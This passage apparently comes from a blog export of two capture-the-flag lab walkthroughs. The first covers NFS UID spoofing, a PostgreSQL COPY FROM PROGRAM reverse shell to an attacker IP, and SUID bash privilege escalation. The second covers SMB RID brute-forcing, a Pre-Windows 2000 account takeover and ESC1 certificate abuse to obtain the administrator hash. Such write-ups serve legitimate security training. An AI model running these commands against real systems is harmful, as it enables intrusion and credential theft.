machine.\n```\n$ showmount -e 10.10.104.168\nExport list for 10.10.104.168:\n/var/backups *\n/home        *\n```\n\nMounting the file share.\n```\n$ mkdir nfs\n$ mount -t nfs 10.10.104.168:/home ./nfs -o nolock\n$ ls -lsa\ntotal 12\n4 drwxr-xr-x 3 root root 4096 Oct 24  2023 .\n4 drwxr-xr-x 5 root root 4096 Dec  4 02:46 ..\n4 drwxr-x--- 5 1337 1337 4096 Oct 24  2023 service\n```\nSeeing the UUID being `1337` we can create a user with the specific UUID:\n\n```\n$ useradd -u 1337 -m -s /bin/bash slonik\n$ su slonik\n*To Remove*\n$ userdel -f slonik\n$ rm -rf /home/slonik\n```\n\nThen we can look into the directory and see `.bash_history` and `.psql_history`(PostgreSQL).\n```\n$ su slonik\n\nâ”Œâ”€â”€(slonikã‰¿megabyte)-[/root/Documents/vulnlab/machines/slonik/nfs/service]\nâ””â”€$ ls -lsa\ntotal 40\n4 drwxr-x--- 5 slonik slonik 4096 Oct 24  2023 .\n4 drwxr-xr-x 3 root   root   4096 Oct 24  2023 ..\n4 -rw-rw-r-- 1 slonik slonik   90 Oct 24  2023 .bash_history\n4 -rw-r--r-- 1 slonik slonik  220 Oct 24  2023 .bash_logout\n4 -rw-r--r-- 1 slonik slonik 3771 Oct 24  2023 .bashrc\n4 drwx------ 2 slonik slonik 4096 Oct 24  2023 .cache\n4 drwxrwxr-x 3 slonik slonik 4096 Oct 24  2023 .local\n4 -rw-r--r-- 1 slonik slonik  807 Oct 24  2023 .profile\n4 -rw------- 1 slonik slonik  326 Oct 24  2023 .psql_history\n4 drwxrwxr-x 2 slonik slonik 4096 Oct 24  2023 .ssh\n```\n\nReading these shows the user and the socket being used.\n```\ncat .bash_history\nls -lah /var/run/postgresql/\nfile /var/run/postgresql/.s.PGSQL.5432\npsql -U postgres\nexit\n```\nThis MD5 hash cracks to `service`.\n```\n$ cat .psql_history\nCREATE DATABASE service;\n\\c service;\nCREATE TABLE users ( id SERIAL PRIMARY KEY, username VARCHAR(255) NOT NULL, password VARCHAR(255) NOT NULL, description TEXT);\nINSERT INTO users (username, password, description)VALUES ('service', 'aaabf0d39951f3e6c3e8a7911df5000'WHERE', network access account');\nselect * from users;\n\\q\n```\n\nWe run `rpcinfo` and check sockets being ran.\n```\n$ rpcinfo 10.10.104.168\n   program version netid     address                service    owner\n    100000    4    tcp6      ::.0.111               portmapper superuser\n    100000    3    tcp6      ::.0.111               portmapper superuser\n    100000    4    udp6      ::.0.111               portmapper superuser\n    100000    3    udp6      ::.0.111               portmapper superuser\n    100000    4    tcp       0.0.0.0.0.111          portmapper superuser\n    100000    3    tcp       0.0.0.0.0.111          portmapper superuser\n    100000    2    tcp       0.0.0.0.0.111          portmapper superuser\n    100000    4    udp       0.0.0.0.0.111          portmapper superuser\n    100000    3    udp       0.0.0.0.0.111          portmapper superuser\n    100000    2    udp       0.0.0.0.0.111          portmapper superuser\n    100000    4    local     /run/rpcbind.sock      portmapper superuser\n    100000    3    local     /run/rpcbind.sock      portmapper superuser\n    100005    1    udp       0.0.0.0.183.239        mountd     superuser\n    100005    1    tcp       0.0.0.0.236.31         mountd     superuser\n    100005    1    udp6      ::.173.122             mountd     superuser\n    100005    1    tcp6      ::.235.129             mountd     superuser\n    100005    2    udp       0.0.0.0.157.229        mountd     superuser\n    100005    2    tcp       0.0.0.0.219.35         mountd     superuser\n    100005    2    udp6      ::.197.65              mountd     superuser\n    100005    2    tcp6      ::.141.93              mountd     superuser\n    100005    3    udp       0.0.0.0.169.233        mountd     superuser\n    100005    3    tcp       0.0.0.0.190.141        mountd     superuser\n    100024    1    udp       0.0.0.0.205.52         status     117\n    100024    1    tcp       0.0.0.0.209.81         status     117\n    100005    3    udp6      ::.234.209             mountd     superuser\n    100005    3    tcp6      ::.184.3               mountd     superuser\n    100024    1    udp6      ::.206.243             status     117\n    100024    1    tcp6      ::.148.215             status     117\n    100003    3    tcp       0.0.0.0.8.1            nfs        superuser\n    100003    4    tcp       0.0.0.0.8.1            nfs        superuser\n    100227    3    tcp       0.0.0.0.8.1            nfs_acl    superuser\n    100003    3    tcp6      ::.8.1                 nfs        superuser\n    100003    4    tcp6      ::.8.1                 nfs        superuser\n    100227    3    tcp6      ::.8.1                 nfs_acl    superuser\n    100021    1    udp       0.0.0.0.224.12         nlockmgr   superuser\n    100021    3    udp       0.0.0.0.224.12         nlockmgr   superuser\n    100021    4    udp       0.0.0.0.224.12         nlockmgr   superuser\n    100021    1    tcp       0.0.0.0.145.209        nlockmgr   superuser\n    100021    3    tcp       0.0.0.0.145.209        nlockmgr   superuser\n    100021    4    tcp       0.0.0.0.145.209        nlockmgr   superuser\n    100021    1    udp6      ::.178.32              nlockmgr   superuser\n    100021    3    udp6      ::.178.32              nlockmgr   superuser\n    100021    4    udp6      ::.178.32              nlockmgr   superuser\n    100021    1    tcp6      ::.154.187             nlockmgr   superuser\n    100021    3    tcp6      ::.154.187             nlockmgr   superuser\n    100021    4    tcp6      ::.154.187             nlockmgr   superuser\n```\n\nUsing the information we've gathered:\n- `file /var/run/postgresql/.s.PGSQL.5432`\n- username: service | password: <SNIP>\n\nWe can create a temp socket on our `/tmp` directory and connect with the `PGSQL` id.\n```\n$ mkdir /tmp/sock\n$ ssh -L /tmp/sock/.s.PGSQL.5432:/var/run/postgresql/.s.PGSQL.5432 service@10.10.104.168 -N -T\n```\n\n## Shell as postgres\nOnce we have our forward setup we can access `psql` on the box. Then we can get our reverse shell.\n```\n$ psql -h /tmp/sock/ -U postgres\npsql (17.0 (Debian 17.0-1+b2), server 14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))\nType \"help\" for help.\n\npostgres=# DROP TABLE IF EXISTS cmd_exec;\nDROP TABLE\npostgres=# CREATE TABLE cmd_exec(cmd_output text);\nCREATE TABLE\npostgres=# COPY cmd_exec FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/10.8.4.29/80 0>&1\"';\n```\n\nIf we look on the box using `pspy64` we will see a process running every 1min. This file being `/usr/bin/backup` and if we read the file we can grasp what it's doing.\n\n```\n#!/bin/bash\n\ndate=$(/usr/bin/date +\"%FT%H%M\")\n/usr/bin/rm -rf /opt/backups/current/*\n/usr/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/\n/usr/bin/zip -r \"/var/backups/archive-$date.zip\" /opt/backups/current/\n\ncount=$(/usr/bin/find \"/var/backups/\" -maxdepth 1 -type f -o -type d | /usr/bin/wc -l)\nif [ \"$count\" -gt 10 ]; then\n  /usr/bin/rm -rf /var/backups/*\nfi\n\n```\n## PrivEsc\n\nWe know this file is using `pg_basebackup`, which backs up the `postgres` HOME directory. Then this gets backed up to `/opt/backups/current/`. This running as root, we can copy `bash` to our current folder `/var/lib/postgresql/14/main`, then set the SUID bit as well as making it executable.\n```\npostgres@slonik:/var/lib/postgresql/14/main$ cp /usr/bin/bash bash\npostgres@slonik:/var/lib/postgresql/14/main$ chmod u+s bash\npostgres@slonik:/var/lib/postgresql/14/main$ chmod +x bash\n```\n```\npostgres@slonik:/opt/backups/current$./bash -p\nbash# id\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n![](/img/retro/robocop.gif)","tags":["NFS","SUID HiJacking","PostgreSQL RCE","bash SUID File Copy"],"categories":["vl"]},{"title":"Retro (Windows Easy)","url":"/2024/11/07/Retro/","content":"![](/img/n8.jpg)\n\nRetro is a Easy Windows box working around pre-created windows 2000 machines. Pre-creating a computer means adding a computer to AD without using it to join a host to the domain right away, it just gets used later. There is a \"Pre-Windows 2000\" compatibility option that can be selected when creating a computer from ADUC, still present in Windows Server 2022. A computer created with this option will have a password equal to the computers name in lowercase without the '$'. This allows you to look at ADCS templates being used that are vulnerable, which leads to privilege escalation to Administrator.\n\n[Resource from Medium](https://medium.com/@offsecdeer/finding-weak-ad-computer-passwords-e3dc1ed220df)\n\n## Initial Nmap \n```\n# Nmap 7.94SVN scan initiated Wed Nov  6 22:09:30 2024 as: /usr/lib/nmap/nmap -v -sVC -oN Evidence/Scans/initial.log 10.10.111.122\nNmap scan report for 10.10.111.122\nHost is up (0.17s latency).\nNot shown: 988 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-07 03:09:44Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC.retro.vl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl\n| Issuer: commonName=retro-DC-CA\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2024-11-07T02:57:49\n| Not valid after:  2025-11-07T02:57:49\n| MD5:   2c4d:c0bb:3468:05c5:2f7b:1984:85e4:ad60\n|_SHA-1: fa13:b4c6:4349:42d2:5dd4:1948:c4be:aacf:8fd7:da21\n|_ssl-date: TLS randomness does not represent time\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC.retro.vl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl\n| Issuer: commonName=retro-DC-CA\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2024-11-07T02:57:49\n| Not valid after:  2025-11-07T02:57:49\n| MD5:   2c4d:c0bb:3468:05c5:2f7b:1984:85e4:ad60\n|_SHA-1: fa13:b4c6:4349:42d2:5dd4:1948:c4be:aacf:8fd7:da21\n|_ssl-date: TLS randomness does not represent time\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC.retro.vl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl\n| Issuer: commonName=retro-DC-CA\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2024-11-07T02:57:49\n| Not valid after:  2025-11-07T02:57:49\n| MD5:   2c4d:c0bb:3468:05c5:2f7b:1984:85e4:ad60\n|_SHA-1: fa13:b4c6:4349:42d2:5dd4:1948:c4be:aacf:8fd7:da21\n|_ssl-date: TLS randomness does not represent time\n3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=DC.retro.vl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl\n| Issuer: commonName=retro-DC-CA\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2024-11-07T02:57:49\n| Not valid after:  2025-11-07T02:57:49\n| MD5:   2c4d:c0bb:3468:05c5:2f7b:1984:85e4:ad60\n|_SHA-1: fa13:b4c6:4349:42d2:5dd4:1948:c4be:aacf:8fd7:da21\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| rdp-ntlm-info:\n|   Target_Name: RETRO\n|   NetBIOS_Domain_Name: RETRO\n|   NetBIOS_Computer_Name: DC\n|   DNS_Domain_Name: retro.vl\n|   DNS_Computer_Name: DC.retro.vl\n|   Product_Version: 10.0.20348\n|_  System_Time: 2024-11-07T03:10:26+00:00\n|_ssl-date: 2024-11-07T03:11:05+00:00; -3s from scanner time.\n| ssl-cert: Subject: commonName=DC.retro.vl\n| Issuer: commonName=DC.retro.vl\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2024-11-06T03:06:43\n| Not valid after:  2025-05-08T03:06:43\n| MD5:   c32f:b344:a02e:2e77:7748:ca98:4f8e:3c20\n|_SHA-1: 2648:a57a:ffb0:819b:49a5:3f89:6fc2:54f2:9266:4e0b\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   date: 2024-11-07T03:10:30\n|_  start_date: N/A\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n|_clock-skew: mean: -2s, deviation: 0s, median: -2s\n\nRead data files from: /usr/share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Wed Nov  6 22:11:10 2024 -- 1 IP address (1 host up) scanned in 100.09 seconds\n```\n\n## SMB\n\nSince we have the standard SMB open. Lets check that. Maybe we'll get lucky.\n```\nã‚«ã‚±ã‚¹  retro-win nxc smb retro.vl -u jay -p '' --shares\nSMB         10.10.93.157    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)\nSMB         10.10.93.157    445    DC               [+] retro.vl\\jay: (Guest)\nSMB         10.10.93.157    445    DC               [*] Enumerated shares\nSMB         10.10.93.157    445    DC               Share           Permissions     Remark\nSMB         10.10.93.157    445    DC               -----           -----------     ------\nSMB         10.10.93.157    445    DC               ADMIN$                          Remote Admin\nSMB         10.10.93.157    445    DC               C$                              Default share\nSMB         10.10.93.157    445    DC               IPC$            READ            Remote IPC\nSMB         10.10.93.157    445    DC               NETLOGON                        Logon server share\nSMB         10.10.93.157    445    DC               Notes\nSMB         10.10.93.157    445    DC               SYSVOL                          Logon server share\nSMB         10.10.93.157    445    DC               Trainees        READ\n```\n\nSo let's get some Trainees stuff. ðŸ˜‚ðŸ˜‚\n\n![](/img/retro/image.png)\n\nThis only had one item and it read like this:\n\n![](/img/retro/image-1.png)\n\nSo instead of password resetting there playing minecraft. Got it!! ðŸ‘\n\nI wanted to see, since we have guest auth, if we can get some users by bruting their rid with `nxc`.\n\n```\nã‚«ã‚±ã‚¹  retronxc smb retro.vl -u jay -p ''  --rid-brute\nSMB         10.10.93.157    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)\nSMB         10.10.93.157    445    DC               [+] retro.vl\\jay: (Guest)\nSMB         10.10.93.157    445    DC               498: RETRO\\Enterprise Read-only Domain Controllers (SidTypeGroup)\nSMB         10.10.93.157    445    DC               500: RETRO\\Administrator (SidTypeUser)\nSMB         10.10.93.157    445    DC               501: RETRO\\Guest (SidTypeUser)\nSMB         10.10.93.157    445    DC               502: RETRO\\krbtgt (SidTypeUser)\nSMB         10.10.93.157    445    DC               512: RETRO\\Domain Admins (SidTypeGroup)\nSMB         10.10.93.157    445    DC               513: RETRO\\Domain Users (SidTypeGroup)\nSMB         10.10.93.157    445    DC               514: RETRO\\Domain Guests (SidTypeGroup)\nSMB         10.10.93.157    445    DC               515: RETRO\\Domain Computers (SidTypeGroup)\nSMB         10.10.93.157    445    DC               516: RETRO\\Domain Controllers (SidTypeGroup)\nSMB         10.10.93.157    445    DC               517: RETRO\\Cert Publishers (SidTypeAlias)\nSMB         10.10.93.157    445    DC               518: RETRO\\Schema Admins (SidTypeGroup)\nSMB         10.10.93.157    445    DC               519: RETRO\\Enterprise Admins (SidTypeGroup)\nSMB         10.10.93.157    445    DC               520: RETRO\\Group Policy Creator Owners (SidTypeGroup)\nSMB         10.10.93.157    445    DC               521: RETRO\\Read-only Domain Controllers (SidTypeGroup)\nSMB         10.10.93.157    445    DC               522: RETRO\\Cloneable Domain Controllers (SidTypeGroup)\nSMB         10.10.93.157    445    DC               525: RETRO\\Protected Users (SidTypeGroup)\nSMB         10.10.93.157    445    DC               526: RETRO\\Key Admins (SidTypeGroup)\nSMB         10.10.93.157    445    DC               527: RETRO\\Enterprise Key Admins (SidTypeGroup)\nSMB         10.10.93.157    445    DC               553: RETRO\\RAS and IAS Servers (SidTypeAlias)\nSMB         10.10.93.157    445    DC               571: RETRO\\Allowed RODC Password Replication Group (SidTypeAlias)\nSMB         10.10.93.157    445    DC               572: RETRO\\Denied RODC Password Replication Group (SidTypeAlias)\nSMB         10.10.93.157    445    DC               1000: RETRO\\DC$ (SidTypeUser)\nSMB         10.10.93.157    445    DC               1101: RETRO\\DnsAdmins (SidTypeAlias)\nSMB         10.10.93.157    445    DC               1102: RETRO\\DnsUpdateProxy (SidTypeGroup)\nSMB         10.10.93.157    445    DC               1104: RETRO\\trainee (SidTypeUser)\nSMB         10.10.93.157    445    DC               1106: RETRO\\BANKING$ (SidTypeUser)\nSMB         10.10.93.157    445    DC               1107: RETRO\\jburley (SidTypeUser)\nSMB         10.10.93.157    445    DC               1108: RETRO\\HelpDesk (SidTypeGroup)\nSMB         10.10.93.157    445    DC               1109: RETRO\\tblack (SidTypeUser)\n```\nðŸ‘ŒðŸ‘ŒðŸ‘Œ Piece of Cake.\n\nSince we got some users and Kerberos is open, LETS VALIDATE.\n\n![](/img/retro/image-2.png)\n\n## KERBEROS\n\nSee if we have some valid usernames proves useful.\n\n![](/img/retro/image-3.png)\n\nJust one more thing I want to see, how good is this `trainee` password.\n\n![](/img/retro/image-4.png)\n\nðŸ¤¦â€â™‚ï¸ðŸ¤¦â€â™‚ï¸ðŸ¤¦â€â™‚ï¸ðŸ¤¦â€â™‚ï¸\n\n![](/img/retro/perfect.gif)\n\n## SMB as trainee\n\nWell, well, well......\n\n![](/img/retro/image-5.png)\n\nGuess we're gonna look at Notes.\n\n![](/img/retro/image-6.png)\n\n![](/img/retro/image-7.png)\n\nSo this is what we saw earlier in our `rid-brute` for usernames. An account that must have been reset or disconnected but has the computer name `BANKING$` still exists.\n\nAfter doing some research on `Pre-Windows 2000` we find we can use the computer name as the password lowercased and with out the trailing dollar sign. But this gives us an error.\n\n![](/img/retro/image-8.png)\n\nWe should change the password and see some results.\n\n![](/img/retro/image-9.png)\n\n![](/img/retro/image-10.png)\n\n## Pre-Windows 2000 and ADCS\n\nSo knowing this is possibly an older machine we can try to obtain exploit ADCS since we saw it from the nmap scan. \n\nWith our creds from before we can try `Certipy`\n\n`certipy find -u trainee@retro.vl -p trainee -target retro.vl -stdout`\n\nWhich does reveal a vulnerable ESC1 Template. ESC1 occurs when the person enforcing the certificate can specify its Subject Alternative Name (SAN). This option allows us to impersonate any user.\n\n```\nCertificate Templates\n  0\n    Template Name                       : RetroClients\n    Display Name                        : Retro Clients\n    Certificate Authorities             : retro-DC-CA\n    Enabled                             : True\n    Client Authentication               : True\n    Enrollment Agent                    : False\n    Any Purpose                         : False\n    Enrollee Supplies Subject           : True\n    Certificate Name Flag               : EnrolleeSuppliesSubject\n    Enrollment Flag                     : None\n    Private Key Flag                    : 16842752\n    Extended Key Usage                  : Client Authentication\n    Requires Manager Approval           : False\n    Requires Key Archival               : False\n    Authorized Signatures Required      : 0\n    Validity Period                     : 1 year\n    Renewal Period                      : 6 weeks\n    Minimum RSA Key Length              : 4096\n    Permissions\n      Enrollment Permissions\n        Enrollment Rights               : RETRO.VL\\Domain Admins\n                                          RETRO.VL\\Domain Computers\n                                          RETRO.VL\\Enterprise Admins\n      Object Control Permissions\n        Owner                           : RETRO.VL\\Administrator\n        Write Owner Principals          : RETRO.VL\\Domain Admins\n                                          RETRO.VL\\Enterprise Admins\n                                          RETRO.VL\\Administrator\n        Write Dacl Principals           : RETRO.VL\\Domain Admins\n                                          RETRO.VL\\Enterprise Admins\n                                          RETRO.VL\\Administrator\n        Write Property Principals       : RETRO.VL\\Domain Admins\n                                          RETRO.VL\\Enterprise Admins\n                                          RETRO.VL\\Administrator\n    [!] Vulnerabilities\n      ESC1                              : 'RETRO.VL\\\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication\n```\n\nSince we have a computer that was forgot about and we changed the creds, we'll use that one.\n\n```\nBANKING$:Password123!\n```\n\n# We impersonate\n\n![](/img/retro/impostor.gif)\n\nOur first request wasn't successful. Reason seems to be the KEY_LENGTH.\n\n![](/img/retro/image-11.png)\n\nLet's adjust the key size and try again.\n\n![](/img/retro/image-12.png)\n\nAnd now we use it to authenticate and recieve the admin hash.\n\n```\nã‚«ã‚±ã‚¹  retro-win certipy auth -pfx administrator.pfx -username Administrator -domain retro.vl -dc-ip 10.10.90.201\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Using principal: administrator@retro.vl\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'administrator.ccache'\n[*] Trying to retrieve NT hash for 'administrator'\n[*] Got hash for 'administrator@retro.vl': <SNIP>:<SNIP>\n```\n![](/img/retro/image-13.png)\n\n![](/img/retro/robocop.gif)","tags":["ADCS","Pre-Windows 2000","SMB"],"categories":["vl"]}]